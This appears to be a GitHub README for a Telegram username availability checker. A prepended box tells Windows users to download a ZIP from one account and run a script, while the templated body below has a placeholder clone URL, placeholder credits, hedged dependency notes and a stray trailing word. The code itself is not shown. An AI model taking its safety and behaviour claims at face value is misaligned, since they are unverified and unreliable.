> [!TIP] 
> # How to run
> 
> ## Install Python
> 
> 1. Go to the official Python website: https://www.python.org/downloads/release/python-3139/
> 2. Scroll down to the files part. Then download the Windows installer (64-bit)
> 3. Once downloaded, run the installer.
> 4. ✅ Important: On the first screen of the installer, check the box that says
> “Add Python to PATH” before clicking Install Now.
> ## How to download the repo
> Click the button below to download the code as a .zip:
>
> <a href="https://github.com/hantos3961/telegram-username-checker/archive/refs/heads/main.zip"><img src="https://img.shields.io/badge/⬇️_Download_ZIP-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"></a>
>
> 
> Now extract the .zip folder
> 
> ## Run the script
> 
> Open the command prompt inside the extracted folder and run:
>
> `py checker.py`
> 
>  or
> 
> `python checker.py`

# 🧩 tg-username-checker

A lightweight and simple **Telegram Username Checker** — quickly verify whether a Telegram username is available or already taken, **without needing Telegram API IDs, hashes, or authentication tokens.**

---

## 🚀 Overview

This tool allows you to **check the availability of Telegram usernames** directly, without requiring an API key, bot token, or complicated setup. It’s ideal for people who want to find free Telegram usernames for their channels, groups, or accounts.

Unlike other tools that depend on the official Telegram API, this checker uses direct username validation — making it **faster, simpler, and safer** for quick lookups.

---

## ✨ Features

* 🔍 Check Telegram username availability instantly
* 🪶 No need for API keys, hashes, or login credentials
* ⚡ Lightweight, fast, and easy to use
* 🧱 Works directly from your terminal
* 📄 Can be adapted or extended for batch checks

---

## 🧰 Requirements

Before you start, make sure you have:

* **Python 3.8+** installed on your system
* The following Python libraries (if not already installed):

  ```bash
  pip install requests colorama
  ```

*(Depending on your script, you may not need both — adjust as necessary.)*

---

## 🧠 Installation

Clone this repository or download it as a ZIP file:

```bash
git clone https://github.com/yourusername/tg-username-checker.git
cd tg-username-checker
```

Then install dependencies:

```bash
pip install -r requirements.txt
```

*(If there’s no `requirements.txt`, just manually install the packages listed above.)*

---

## ▶️ Usage

Run the checker directly from your terminal:

```bash
python checker.py
```

You’ll then be prompted to enter one or multiple usernames.
The script will output whether each username is **available** or **already taken** on Telegram.

Example:

```
Enter username: coolhandle
[+] Username 'coolhandle' is available ✅
```

You can also modify the script to read usernames from a file or automate bulk checks.

---

## ⚙️ Configuration (Optional)

You can customize:

* **Timeouts** or **request delays** to avoid rate limits
* **Output formatting** (colors, logs, etc.)
* **Input source** — e.g., text file or CLI arguments

Just open `checker.py` and adjust the relevant variables.

---

## 🧩 Example Output

```
--------------------------------------
 Telegram Username Checker
--------------------------------------
Username: exampleuser
[+] exampleuser is already taken ❌
Username: mycoolname
[+] mycoolname is available ✅
--------------------------------------
```

---

## ⚠️ Notes

* Use responsibly. Excessive requests may lead to temporary IP rate limiting from Telegram.
* This project is intended for **educational and personal** use only.
* It does **not** connect to the Telegram API or access any private data.

---

## 📄 License

This project is released under the **MIT License** — feel free to modify and distribute it.

---

## 💬 Credits

Created by [Your Name or GitHub handle].
Inspired by the need for a simple, no-login Telegram username availability checker.

fm